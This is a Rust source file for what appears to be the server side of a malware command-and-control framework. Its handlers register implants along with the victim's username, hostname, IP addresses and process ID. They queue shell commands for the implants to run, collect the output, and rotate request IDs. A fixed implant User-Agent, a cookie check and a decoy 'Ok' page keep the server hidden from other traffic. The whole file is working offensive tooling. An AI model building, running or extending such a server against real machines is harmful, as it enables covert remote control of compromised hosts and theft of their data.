use actix_web::{web, HttpRequest, HttpResponse, Responder};
use colored::Colorize;
use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::links::Links;

/// User-Agent that all implants must present.
const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

pub struct AppState {
    pub links: Arc<Mutex<Links>>,
}

// ── Request/Response types ──────────────────────────────────────────────────

#[derive(Deserialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    #[serde(default)]
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

#[derive(Deserialize)]
pub struct CallbackRequest {
    /// Output of the previously executed task (empty on first poll).
    pub q: String,
    /// ID of the completed task (empty if none).
    pub tasking: String,
}

#[derive(Serialize)]
struct TaskResponse {
    /// Command to execute (empty when idle).
    q: String,
    /// Task ID to track (empty when idle).
    tasking: String,
    /// Rolling request ID; implant must echo this on the next call.
    x_request_id: String,
}

// ── Header guards ───────────────────────────────────────────────────────────

fn ua_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("User-Agent")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|ua| ua == IMPLANT_UA)
}

fn cookie_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("Cookie")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|c| c.contains("banner=banner"))
}

// ── Handlers ────────────────────────────────────────────────────────────────

/// GET / – decoy for non-implant traffic.
pub async fn ok_handler() -> impl Responder {
    HttpResponse::Ok().body("Ok\n")
}

/// GET /js – Stage 1: set session cookie, validate User-Agent.
pub async fn stage1_handler(req: HttpRequest) -> impl Responder {
    if !ua_ok(&req) {
        return HttpResponse::NotFound().finish();
    }
    HttpResponse::Ok()
        .insert_header(("Set-Cookie", "banner=banner; Path=/"))
        .body("")
}

/// POST /static/register – Stage 2: implant registration.
pub async fn stage2_handler(
    req: HttpRequest,
    body: web::Json<RegisterRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    let mut links = data.links.lock().unwrap();
    let link = links.add_link(
        body.link_username.clone(),
        body.link_hostname.clone(),
        body.internal_ip.clone(),
        body.external_ip.clone(),
        body.platform.clone(),
        body.pid,
    );

    let resp = TaskResponse {
        q: String::new(),
        tasking: String::new(),
        x_request_id: link.x_request_id.to_string(),
    };
    let link_name = link.name.clone();
    drop(links);

    tracing::info!(
        "New link: {} ({}@{}) [{}]",
        link_name,
        body.link_username,
        body.link_hostname,
        body.platform
    );

    HttpResponse::Ok().json(resp)
}

/// POST /static/get – Stage 3: task polling / output callback.
pub async fn stage3_handler(
    req: HttpRequest,
    body: web::Json<CallbackRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    let Some(x_req_id) = req
        .headers()
        .get("x-request-id")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| Uuid::parse_str(s).ok())
    else {
        return HttpResponse::BadRequest().finish();
    };

    let mut links = data.links.lock().unwrap();

    let Some(link_id) = links.find_by_request_id(x_req_id).map(|l| l.id) else {
        return HttpResponse::NotFound().finish();
    };

    // Submit output from previous task
    if !body.tasking.is_empty() {
        if let Ok(task_id) = Uuid::parse_str(&body.tasking) {
            if !body.q.is_empty() {
                let (link_name, cli_cmd) = links
                    .get_link(link_id)
                    .map(|l| {
                        let cmd = l
                            .tasks
                            .iter()
                            .find(|t| t.id == task_id)
                            .map(|t| t.cli_command.clone())
                            .unwrap_or_default();
                        (l.name.clone(), cmd)
                    })
                    .unwrap_or_else(|| ("unknown".into(), String::new()));

                const OUTPUT_BOX_WIDTH: usize = 54;
                let now = chrono::Local::now().format("%H:%M:%S");
                let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
                let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
                tracing::info!(
                    "\n{}",
                    format!("╔{}{}╗", header_text, "═".repeat(pad))
                        .cyan()
                        .bold()
                );
                tracing::info!("{}", body.q);
                tracing::info!(
                    "{}\n",
                    format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold()
                );
            }
            links.complete_task(link_id, task_id, body.q.clone());
        }
    }

    // Rotate request ID
    let new_x_req_id = Uuid::new_v4();
    links.update_checkin(link_id, new_x_req_id);

    // Dispatch next waiting task, if any
    let (q, tasking) = links
        .get_next_task(link_id)
        .map(|t| (t.command, t.id.to_string()))
        .unwrap_or_default();
    let resp = TaskResponse {
        q,
        tasking,
        x_request_id: new_x_req_id.to_string(),
    };

    HttpResponse::Ok().json(resp)
}
